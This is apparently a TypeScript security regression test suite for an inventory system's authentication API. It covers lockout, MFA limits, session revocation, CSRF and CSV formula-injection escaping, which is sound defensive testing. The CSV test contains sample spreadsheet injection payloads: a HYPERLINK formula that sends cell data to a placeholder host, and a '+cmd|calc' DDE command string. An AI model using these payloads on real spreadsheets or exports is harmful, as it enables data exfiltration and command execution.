import test, { before } from 'node:test';
import assert from 'node:assert/strict';
import { addUser, call, login, loadSchema, db } from './helpers.ts';

const ipHeader = (ip: string) => ({ 'x-forwarded-for': ip });

before(async () => {
  await loadSchema();
});

// ---------- AUD-001: bloqueio atômico ----------
test('AUD-001: 30 logins errados em paralelo → no máximo 5 chegam a testar a senha', async () => {
  await addUser('conc@x.com', 'Conc', 'operator');
  const res = await Promise.all(Array.from({ length: 30 }, () => call('POST', '/auth/login', { email: 'conc@x.com', password: 'errada-errada-1' }, undefined, ipHeader('10.0.0.1'))));
  const evaluated = res.filter((r) => r.status === 401).length;
  const blocked = res.filter((r) => r.status === 429).length;
  assert.ok(evaluated <= 5, `senhas avaliadas: ${evaluated}`);
  assert.equal(evaluated + blocked, 30);
});

// ---------- AUD-002: resposta uniforme e sem DoS entre IPs ----------
test('AUD-002: conta existente e inexistente respondem do mesmo jeito', async () => {
  await addUser('uni@x.com', 'Uni', 'operator');
  const seq = async (email: string, ip: string) => {
    const out: number[] = [];
    for (let i = 0; i < 7; i++) out.push((await call('POST', '/auth/login', { email, password: 'errada-errada-1' }, undefined, ipHeader(ip))).status);
    return out;
  };
  const existing = await seq('uni@x.com', '10.0.0.2');
  const ghost = await seq('fantasma@x.com', '10.0.0.3');
  assert.deepEqual(existing, ghost);
  assert.deepEqual(existing, [401, 401, 401, 401, 401, 429, 429]);
});

test('AUD-002: atacante em outro IP não impede o dono de entrar', async () => {
  await addUser('dono@x.com', 'Dono', 'admin');
  for (let i = 0; i < 8; i++) await call('POST', '/auth/login', { email: 'dono@x.com', password: 'errada-errada-1' }, undefined, ipHeader('203.0.113.9'));
  const cookie = await login('dono@x.com', 'senha-super-segura', ipHeader('198.51.100.7'));
  assert.ok(cookie.startsWith('session='));
});

// ---------- AUD-013: MFA cumulativo ----------
test('AUD-013: erros de MFA são cumulativos entre códigos', async () => {
  await addUser('mfa@x.com', 'Mfa', 'operator');
  const wrongOf = (c: string) => (c === '000000' ? '111111' : '000000');
  const statuses: number[] = [];
  let real = '';
  for (let round = 0; round < 3; round++) {
    const l = await call('POST', '/auth/login', { email: 'mfa@x.com', password: 'senha-super-segura' }, undefined, ipHeader('10.0.0.4'));
    assert.equal(l.status, 200);
    const { lastCode } = await import('./helpers.ts');
    real = lastCode;
    for (let i = 0; i < 4; i++) statuses.push((await call('POST', '/auth/verify', { mfaToken: l.data.mfaToken, code: wrongOf(real) }, undefined, ipHeader('10.0.0.4'))).status);
    if (round === 2) {
      // 12 erros acumulados: mesmo o código CORRETO é recusado
      const right = await call('POST', '/auth/verify', { mfaToken: l.data.mfaToken, code: real }, undefined, ipHeader('10.0.0.4'));
      assert.equal(right.status, 429);
    }
  }
  assert.ok(statuses.includes(429), 'deve haver bloqueio cumulativo');
});

test('AUD-013: no máximo 10 e-mails de código por hora por usuário', async () => {
  await addUser('flood@x.com', 'Flood', 'operator');
  const out: number[] = [];
  for (let i = 0; i < 12; i++) out.push((await call('POST', '/auth/login', { email: 'flood@x.com', password: 'senha-super-segura' }, undefined, ipHeader('10.0.0.5'))).status);
  assert.equal(out.filter((s) => s === 200).length, 10);
  assert.equal(out.filter((s) => s === 429).length, 2);
});

// ---------- AUD-012: senhas ----------
test('AUD-012: senha com espaço no fim funciona no login (sem trim)', async () => {
  await addUser('esp@x.com', 'Esp', 'operator', 'senha com espaco no fim ');
  assert.ok((await login('esp@x.com', 'senha com espaco no fim ', ipHeader('10.0.0.6'))).startsWith('session='));
  const wrong = await call('POST', '/auth/login', { email: 'esp@x.com', password: 'senha com espaco no fim' }, undefined, ipHeader('10.0.0.6'));
  assert.equal(wrong.status, 401);
});

test('AUD-012: política de senha (comuns, 72 bytes) e limite da senha atual', async () => {
  await addUser('pol@x.com', 'Pol', 'operator');
  const cookie = await login('pol@x.com', 'senha-super-segura', ipHeader('10.0.0.7'));
  const change = (n: string) => call('POST', '/auth/change-password', { currentPassword: 'senha-super-segura', newPassword: n }, cookie);
  assert.equal((await change('password123')).status, 400);
  assert.equal((await change('Senha12345')).status, 400);
  assert.equal((await change('aaaaaaaaaaaa')).status, 400);
  assert.equal((await change('a'.repeat(80))).status, 400);
  assert.equal((await change('ç'.repeat(40))).status, 400); // 80 bytes
  assert.equal((await change('frase-longa-e-unica-2026')).status, 200);
  // 6 tentativas com a senha atual errada → bloqueio
  const cookie2 = await login('pol@x.com', 'frase-longa-e-unica-2026', ipHeader('10.0.0.7'));
  const codes: number[] = [];
  for (let i = 0; i < 7; i++) codes.push((await call('POST', '/auth/change-password', { currentPassword: 'errada-errada-1', newPassword: 'outra-frase-bem-longa-9' }, cookie2)).status);
  assert.deepEqual(codes.slice(0, 5), [400, 400, 400, 400, 400]);
  assert.equal(codes[6], 429);
});

test('bootstrap: tabela rate_limits existe e expira janelas', async () => {
  const r = await db.query(`select count(*)::int n from rate_limits`);
  assert.ok((r.rows[0] as any).n > 0);
});

// ---------- AUD-003: revogação de sessão ----------
test('AUD-003: logout revoga a sessão no servidor (cookie copiado deixa de valer)', async () => {
  await addUser('sess1@x.com', 'Sess1', 'operator');
  const cookie = await login('sess1@x.com', 'senha-super-segura', ipHeader('10.1.0.1'));
  assert.equal((await call('GET', '/auth/me', undefined, cookie)).status, 200);
  assert.equal((await call('POST', '/auth/logout', {}, cookie)).status, 200);
  assert.equal((await call('GET', '/auth/me', undefined, cookie)).status, 401);
});

test('AUD-003: troca de senha revoga as outras sessões e mantém a atual com token novo', async () => {
  await addUser('sess2@x.com', 'Sess2', 'operator');
  const a = await login('sess2@x.com', 'senha-super-segura', ipHeader('10.1.0.2'));
  const b = await login('sess2@x.com', 'senha-super-segura', ipHeader('10.1.0.2'));
  const r = await call('POST', '/auth/change-password', { currentPassword: 'senha-super-segura', newPassword: 'frase-nova-bem-longa-77' }, a);
  assert.equal(r.status, 200);
  const fresh = r.setCookie!.split(';')[0];
  assert.equal((await call('GET', '/auth/me', undefined, fresh)).status, 200);
  assert.equal((await call('GET', '/auth/me', undefined, a)).status, 401);
  assert.equal((await call('GET', '/auth/me', undefined, b)).status, 401);
});

test('AUD-003: token sem versão (emitido antes da correção) é recusado', async () => {
  const id = await addUser('sess3@x.com', 'Sess3', 'operator');
  const { SignJWT } = await import('jose');
  const old = await new SignJWT({ purpose: 'session' }).setProtectedHeader({ alg: 'HS256' }).setSubject(id).setIssuer('inventory-system').setIssuedAt().setExpirationTime('1h').sign(new TextEncoder().encode('x'.repeat(48)));
  assert.equal((await call('GET', '/auth/me', undefined, `session=${old}`)).status, 401);
});

// ---------- AUD-004: reautenticação e domínio ----------
test('AUD-004: criar usuário exige a senha do admin e e-mail de domínio permitido', async () => {
  await addUser('adm4@x.com', 'Adm4', 'admin');
  const admin = await login('adm4@x.com', 'senha-super-segura', ipHeader('10.4.0.1'));
  const base = { name: 'Novo', email: 'novo4@x.com', role: 'operator', password: 'frase-temporaria-forte-1' };
  const semConfirmacao = await call('POST', '/users', base, admin);
  assert.equal(semConfirmacao.status, 403);
  assert.equal(semConfirmacao.data.code, 'REAUTH_REQUIRED');
  const errada = await call('POST', '/users', { ...base, confirmPassword: 'senha-errada-aqui' }, admin);
  assert.equal(errada.status, 403);
  assert.equal(errada.data.code, 'REAUTH_FAILED');
  assert.equal((await call('POST', '/users', { ...base, email: 'invasor@gmail.com', confirmPassword: 'senha-super-segura' }, admin)).status, 400);
  assert.equal((await call('POST', '/users', { ...base, role: 'admin', confirmPassword: 'senha-super-segura' }, admin)).status, 201);
});

test('AUD-004: tentativas erradas de confirmação são limitadas', async () => {
  await addUser('adm4b@x.com', 'Adm4b', 'admin');
  const admin = await login('adm4b@x.com', 'senha-super-segura', ipHeader('10.4.0.2'));
  const out: number[] = [];
  for (let i = 0; i < 7; i++) out.push((await call('POST', '/users', { name: 'N', email: `n${i}@x.com`, password: 'frase-temporaria-forte-1', confirmPassword: 'errada-errada-1' }, admin)).status);
  assert.deepEqual(out.slice(0, 5), [403, 403, 403, 403, 403]);
  assert.equal(out[6], 429);
});

test('AUD-004/003: mudar papel, status ou senha exige confirmação e revoga as sessões do alvo', async () => {
  await addUser('adm4c@x.com', 'Adm4c', 'admin');
  const admin = await login('adm4c@x.com', 'senha-super-segura', ipHeader('10.4.0.3'));
  const op1 = await addUser('op4a@x.com', 'Op4a', 'operator');
  const op2 = await addUser('op4b@x.com', 'Op4b', 'operator');
  const c1 = await login('op4a@x.com', 'senha-super-segura', ipHeader('10.4.0.4'));
  const c2 = await login('op4b@x.com', 'senha-super-segura', ipHeader('10.4.0.5'));
  assert.equal((await call('PATCH', `/users/${op1}`, { role: 'admin' }, admin)).status, 403);
  assert.equal((await call('PATCH', `/users/${op1}`, { name: 'Op4a Renomeado' }, admin)).status, 200); // só nome: sem confirmação
  // redefinir senha → sessão antiga do alvo revogada
  assert.equal((await call('PATCH', `/users/${op1}`, { password: 'frase-redefinida-forte-2', confirmPassword: 'senha-super-segura' }, admin)).status, 200);
  assert.equal((await call('GET', '/auth/me', undefined, c1)).status, 401);
  // mudar papel → sessão antiga revogada
  assert.equal((await call('PATCH', `/users/${op2}`, { role: 'admin', confirmPassword: 'senha-super-segura' }, admin)).status, 200);
  assert.equal((await call('GET', '/auth/me', undefined, c2)).status, 401);
});

// ---------- AUD-007: injeção de fórmula em CSV ----------
test('AUD-007: células iniciadas por = + - @ são neutralizadas; números e escapes preservados', async () => {
  const { csvCell } = await import('../src/format.ts');
  assert.equal(csvCell('=HYPERLINK("http://exemplo.invalido/"&A2;"x")'), `"'=HYPERLINK(""http://exemplo.invalido/""&A2;""x"")"`);
  assert.equal(csvCell('@SUM(1+1)'), "'@SUM(1+1)");
  assert.equal(csvCell('+cmd|calc'), "'+cmd|calc");
  assert.equal(csvCell('-2+3'), "'-2+3");
  assert.equal(csvCell('\t=1+1'), "'\t=1+1");
  assert.equal(csvCell('-12,50'), '-12,50');
  assert.equal(csvCell(-3.5), '-3.5');
  assert.equal(csvCell('11987654321'), '11987654321');
  assert.equal(csvCell('Maria; Silva'), '"Maria; Silva"');
  assert.equal(csvCell('Obra "A"'), '"Obra ""A"""');
});

// ---------- AUD-014: CSRF ----------
test('AUD-014: mutações sem o cabeçalho do front ou vindas de outro site são recusadas', async () => {
  await addUser('csrf@x.com', 'Csrf', 'admin');
  const cookie = await login('csrf@x.com', 'senha-super-segura', ipHeader('10.5.0.1'));
  const noHeader = await call('POST', '/auth/logout', {}, cookie, { 'x-requested-with': '' });
  assert.equal(noHeader.status, 403);
  assert.equal(noHeader.data.code, 'CSRF');
  const cross = await call('DELETE', '/lines/00000000-0000-0000-0000-000000000000', undefined, cookie, { 'sec-fetch-site': 'cross-site' });
  assert.equal(cross.status, 403);
  const sameSite = await call('DELETE', '/lines/00000000-0000-0000-0000-000000000000', undefined, cookie, { 'sec-fetch-site': 'same-site' });
  assert.equal(sameSite.status, 403);
  const ok = await call('DELETE', '/lines/00000000-0000-0000-0000-000000000000', undefined, cookie, { 'sec-fetch-site': 'same-origin' });
  assert.equal(ok.status, 404); // passou pela barreira (linha inexistente)
  assert.equal((await call('GET', '/auth/me', undefined, cookie, { 'x-requested-with': '' })).status, 200); // GET não exige
});

// ---------- AUD-017: cabeçalhos da API ----------
test('AUD-017: respostas da API levam nosniff e demais cabeçalhos', async () => {
  const r = await call('GET', '/auth/me');
  assert.equal(r.headers.get('x-content-type-options'), 'nosniff');
  assert.equal(r.headers.get('cache-control'), 'no-store');
  assert.equal(r.headers.get('cross-origin-resource-policy'), 'same-origin');
});
